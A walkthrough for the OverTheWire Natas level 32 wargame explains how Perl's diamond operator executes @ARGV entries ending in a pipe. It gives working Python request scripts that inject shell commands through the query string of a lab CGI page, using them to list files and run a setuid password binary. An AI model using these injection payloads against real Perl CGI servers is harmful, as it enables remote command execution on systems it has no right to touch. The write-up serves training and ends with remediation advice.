# OverTheWire: Natas — Level 32 → Level 33

> **Vulnerability:** Remote Code Execution via Perl `<>` Diamond Operator Pipe-Open through `@ARGV` Injection                                
> **Skills:** Perl CGI internals, pipe-open behavior in `@ARGV`, multipart form-data crafting, setuid binary execution                        
> **Difficulty:** Hard                                                         
> **Official Page:** [Natas Level 32](https://overthewire.org/wargames/natas/natas32.html)

---

## Access

- **URL:** `http://natas32.natas.labs.overthewire.org`
- **Username:** `natas32`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas33` by exploiting the same Perl CGI diamond operator vulnerability from Level 31 — this time escalating from arbitrary file read to remote code execution by abusing Perl's pipe-open behavior.

---

## Vulnerability

This level uses the same application structure as Level 31: a Perl CGI CSV viewer that calls `while(<$file>)` where `$file` can be coerced to the magic `ARGV` filehandle, and where CGI.pm populates `@ARGV` from the URL query string.

The escalation from file read to **remote code execution** comes from a second behavior of Perl's `<>` operator: when an entry in `@ARGV` ends with a pipe character `|`, Perl does not treat it as a filename. Instead, it treats the string as a shell command, opens it as a pipe, and reads the command's standard output as if it were file content. This is Perl's "pipe-open" feature, and it is triggered automatically by the diamond operator with no additional code required.

By placing a shell command followed by `|` in the query string — for example `?ls . |` — the attacker causes `@ARGV` to contain `["ls . |"]`, which the diamond operator executes as a shell command and reads back into the CSV display loop. The output of the command is rendered on the page as table rows.

The password itself is not in a readable file — it is protected by a setuid binary named `getpassword` located in the web root. Executing `./getpassword` as the CGI process (which runs with the appropriate group privileges due to the binary's setuid bit) prints the natas33 password to stdout, which the diamond operator captures and the page renders.

---

## Theory

### Perl `<>` Pipe-Open: Commands in `@ARGV`

In Level 31, the `<>` (diamond) operator read from files named in `@ARGV`. Perl extends this behavior: if any entry in `@ARGV` ends with a pipe character `|`, Perl treats that entry as a shell command rather than a filename and opens a pipe to its stdout.

```perl
@ARGV = ("ls . |");
while (<ARGV>) {   # executes: ls .
    print $_;      # prints each line of ls output
}
```

This is documented Perl behavior — the same mechanism used in command-line scripts like `perl script.pl 'cat /etc/passwd |'`. In a CGI context where `@ARGV` is populated from the URL query string, it becomes a direct remote code execution primitive.

The full behavior of the diamond operator for a given `@ARGV` entry is:

| Entry format | What Perl does |
|---|---|
| `/etc/passwd` | Opens and reads the file |
| `ls . \|` | Executes `ls .` as a shell command, reads its stdout |
| (empty `@ARGV`) | Reads from standard input |

### From File Read to RCE — What Changed

The exploit structure is identical to Level 31:

- Send two `file` parts in the multipart body: one with value `ARGV` (no filename), one with a real filename and content
- Set `@ARGV` via the URL query string

The only change is what goes in the query string. In Level 31 it was a file path. Here it is a shell command suffixed with `|`:

| Level | Query string | `@ARGV` value | Effect |
|---|---|---|---|
| 31 | `?/etc/natas_webpass/natas32` | `["/etc/natas_webpass/natas32"]` | Reads a file |
| 32 | `?ls . \|` | `["ls . \|"]` | Executes a shell command |

### URL Encoding in the Query String

Shell commands placed in a URL query string must be percent-encoded because spaces and other characters have special meaning in URLs:

| Character | URL-encoded form |
|---|---|
| space | `%20` |
| `\|` (pipe) | `%7C` (or left as `\|` — most servers accept it unencoded in query strings) |
| `/` | `%2F` (when part of a value, not a path separator) |

So `ls . |` becomes `ls%20.%20|` in the query string, giving the full URL:

```
http://natas32.natas.labs.overthewire.org/index.pl?ls%20.%20|
```

### The `getpassword` Binary and Setuid

The web root contains a binary named `getpassword` with permissions `-rwsrwx---` owned by `root:natas32`:

```
-rwsrwx--- 1 root natas32 ... getpassword
```

Breaking down the permission bits:

| Bits | Meaning |
|---|---|
| `rws` (owner) | Owner (`root`) can read, write, execute; the `s` (setuid) bit means the binary runs as `root` when executed |
| `rwx` (group) | Group (`natas32`) can read, write, and execute |
| `---` (other) | No permissions for anyone else |

The CGI process runs as a user in the `natas32` group, so it has execute permission. Because of the setuid bit, when `getpassword` runs it does so with `root` privileges, which allows it to read the otherwise-protected `natas33` password and print it to stdout.

The group-write permission (`w` in `rwx`) means members of `natas32` can theoretically overwrite the binary — but in practice the web server's process constraints (filesystem mount options, SELinux/AppArmor policy, or the CGI user not being a full `natas32` shell user) prevent this from working. This is a dead end and is not needed to solve the level.

### Concept Reference Table

| Concept | What It Is | Used in This Level? |
|---|---|---|
| Perl `<>` pipe-open | When a `@ARGV` entry ends with `\|`, Perl executes it as a shell command and reads its stdout | Yes — the RCE mechanism |
| `@ARGV` CGI injection | CGI.pm populates `@ARGV` from the URL query string | Yes — how the command reaches `@ARGV` |
| `ARGV` magic filehandle | Coercing `$file` to the string `"ARGV"` triggers the diamond operator's `@ARGV`-reading mode | Yes — same trick as Level 31 |
| Multipart `file` field duplication | Sending two `file` parts causes CGI.pm's `upload()`/`param()` confusion | Yes — same structure as Level 31 |
| Setuid binary | A binary with the setuid bit runs with the file owner's privileges regardless of who executes it | Yes — `getpassword` runs as root |
| URL percent-encoding | Encoding special characters for safe transmission in URLs | Yes — spaces in the command become `%20` |
| Prepared statements | Parameterized queries immune to injection | Good to know — not needed here |

---

## Solution

### Step 1 — Examine the Application

Navigate to `http://natas32.natas.labs.overthewire.org` and authenticate with your `natas32` credentials at the HTTP Basic Auth prompt.

The page is a CSV file upload viewer — structurally identical to Level 31. It accepts a file upload, POSTs to `index.pl`, and displays the file's contents as an HTML table.

> **What to notice:** The backend is the same Perl CGI pattern as Level 31. The same `ARGV` filehandle trick applies. The only question is what to put in `@ARGV`.

### Step 2 — Read the Vulnerable Source Code

The page includes a link to view `index.pl`. The relevant section:

```perl
# Reconstructed — see post-file note
my $file = $cgi->upload('file');
my $name = $cgi->param('file');

if( defined($file) ){
    while(<$file>){
        # render CSV output as HTML table rows
        print "<tr><td>" . $_ . "</td></tr>\n";
    }
}
```

> **What to notice:** The code is identical in structure to Level 31. The same `upload()`/`param()` confusion applies, and `while(<$file>)` is still the vulnerable read. The escalation to RCE requires no change to the exploit structure — only a different query string.

### Step 3 — Enumerate the Web Root

Before executing `getpassword`, confirm it exists and note its name. Send the exploit with `ls . |` as the command:

```python
import requests
from requests.auth import HTTPBasicAuth

user = 'natas32'
passw = '<natas32_password>'

# Query string: "ls . |"
# URL-encoded spaces: ls%20.%20|
# CGI.pm reads this and sets @ARGV = ["ls . |"]
# The diamond operator sees the trailing | and executes "ls ." as a shell command.
url = 'http://natas32.natas.labs.overthewire.org/index.pl?ls%20.%20|'

# Same two-part file trick as Level 31:
#   Part 1: plain text value "ARGV" with no filename attribute.
#           Causes $file to resolve to the string "ARGV", triggering the magic handle.
#   Part 2: a real file upload part so CGI.pm enters upload-handling mode.
files = [
    ('file', ('', 'ARGV', 'text/plain')),
    ('file', ('abc', b'abcde', 'text/plain')),
]

data = {'submit': 'Upload'}

response = requests.post(
    url,
    files=files,
    data=data,
    auth=HTTPBasicAuth(user, passw)
)

print(response.text)
```

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<html>
...
<div id="content">
<table>
<tr><td>getpassword</td></tr>
<tr><td>index.pl</td></tr>
</table>
...
</div>
</html>
```

> **What to notice:** The table rows contain directory listings — the output of `ls .` executed on the server. The binary `getpassword` is confirmed to be present in the same directory as `index.pl` (the web root). This is the target to execute next.

### Step 4 — Execute `getpassword` to Retrieve the Password

Now change the query string to execute `./getpassword |`. The `./` prefix is required because the current working directory is not in the shell's default `PATH` for CGI processes:

```python
import requests
from requests.auth import HTTPBasicAuth

user = 'natas32'
passw = '<natas32_password>'

# Command: "./getpassword |"
# URL-encoded: ./getpassword%20|
# The trailing | causes Perl to execute ./getpassword as a shell command.
# getpassword is setuid root within the natas32 group, so the CGI process
# (running as natas32) has execute permission and the binary runs as root,
# allowing it to read the natas33 password and print it to stdout.
url = 'http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|'

files = [
    ('file', ('', 'ARGV', 'text/plain')),
    ('file', ('abc', b'abcde', 'text/plain')),
]

data = {'submit': 'Upload'}

response = requests.post(
    url,
    files=files,
    data=data,
    auth=HTTPBasicAuth(user, passw)
)

print(response.text)
```

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<html>
...
<div id="content">
<table>
<tr><td><password_string_here></td></tr>
</table>
...
</div>
</html>
```

> **What to notice:** The table now contains a single row with a 32-character string — the output of `getpassword`, which is the natas33 password. The CSV display loop treats each line of the command's stdout as a table row, so the password appears cleanly in the first `<td>`.

### Step 5 — Extract the Password

Copy the 32-character string from the `<td>` tag in the output. That is the password for `natas33`.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

Perl's diamond operator `<>` has two dangerous behaviors in a CGI context: it reads from files named in `@ARGV` (Level 31), and it executes shell commands whose `@ARGV` entries end in `|` (this level). Both behaviors are triggered by the same `ARGV` filehandle trick and the same CGI.pm query-string population of `@ARGV`. The escalation from arbitrary file read to full RCE required no change to the exploit structure — only a different payload in the query string. This illustrates how a single primitive (control over `@ARGV`) can have consequences far beyond what the original developer considered.

In production Perl CGI code, the fix is to never use bare `<>` or `<ARGV>`, always run with `use strict` and taint mode (`perl -T`), and validate all input before it can influence filehandle operations.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Forgetting the trailing `\|` in the command | `@ARGV` entry is treated as a filename, not a command; Perl tries to open a file named `ls .`, which does not exist; no output | Always end the command with a space and `\|`: `ls . \|` |
| Using `cat /etc/natas_webpass/natas33` as the command | The password file is not world-readable; the CGI process does not have permission to read it directly | Use `./getpassword \|` — the setuid binary reads the file as root on your behalf |
| Omitting `./` from `./getpassword` | The shell cannot find `getpassword` because `.` is not in `$PATH` for CGI processes; command silently fails | Always use `./getpassword \|` to reference the binary by its relative path |
| Sending only one `file` part | CGI.pm does not enter upload-handling mode; `upload('file')` returns undef; the loop never runs | Always send two `file` parts — the `ARGV` text part and a dummy real-file part |
| Sending the real file part before the `ARGV` part | CGI.pm may resolve `param('file')` to the real filename instead of `ARGV` | Keep the `ARGV` text part first in the `files` list |
| Not URL-encoding spaces in the command | Spaces in a query string are interpreted as delimiters; the command is malformed before it reaches `@ARGV` | Use `%20` for each space: `ls%20.%20\|` or `./getpassword%20\|` |
| Forgetting HTTP Basic Auth | Server returns `401 Unauthorized` | Always include `auth=HTTPBasicAuth(user, passw)` |
